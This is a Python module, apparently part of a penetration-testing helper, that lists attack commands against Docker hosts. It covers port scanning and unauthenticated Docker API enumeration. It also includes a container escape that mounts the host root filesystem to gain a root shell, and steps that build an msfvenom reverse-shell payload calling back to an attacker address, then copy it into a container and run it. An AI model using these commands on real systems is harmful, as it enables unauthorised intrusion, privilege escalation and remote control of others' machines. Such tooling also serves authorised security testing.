from Modules.Imports.protocol_imports import *

def check_open_docker(target_ip, open_ports):
    title = "Check for Open Docker Instances"
    content = f"nmap -p 2375 --script docker-version {target_ip}"
    run_command(title, content, target_ip, open_ports)

def enumerate_containers(target_ip, open_ports):
    title = "Enumerate Docker Containers"
    content = (
        f"Use the following commands to enumerate Docker containers:\n\n"
        f"1. If 2375 is open (Docker API):\n"
        f"   curl -s http://{target_ip}:2375/containers/json\n\n"
        f"2. With SSH access:\n"
        f"   docker ps -a\n"
    )
    run_command(title, content, target_ip, open_ports)

def enumerate_images(target_ip, open_ports):
    title = "Enumerate Docker Images"
    content = (
        f"Use the following commands to enumerate Docker images:\n\n"
        f"1. If 2375 is open (Docker API):\n"
        f"   curl -s http://{target_ip}:2375/images/json\n\n"
        f"2. With SSH access:\n"
        f"   docker images\n"
    )
    run_command(title, content, target_ip, open_ports)

def test_privilege_escalation(target_ip, open_ports):
    title = "Test Docker Privilege Escalation"
    content = (
        f"Exploit Docker misconfigurations for privilege escalation:\n\n"
        f"1. If you can run Docker as a non-root user:\n"
        f"   docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n"
        f"2. Check for writable Docker socket:\n"
        f"   ls -la /var/run/docker.sock\n"
    )
    run_command(title, content, target_ip, open_ports)

def upload_and_execute_payload(target_ip, open_ports):
    title = "Upload and Execute Payload in Container"
    content = (
        f"Use the following steps to upload and execute payloads:\n\n"
        f"1. Build a reverse shell payload:\n"
        f"   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f elf -o payload.elf\n\n"
        f"2. Upload to the container:\n"
        f"   docker cp payload.elf <container-id>:/tmp/payload.elf\n\n"
        f"3. Execute the payload:\n"
        f"   docker exec -it <container-id> chmod +x /tmp/payload.elf\n"
        f"   docker exec -it <container-id> /tmp/payload.elf\n"
    )
    run_command(title, content, target_ip, open_ports)
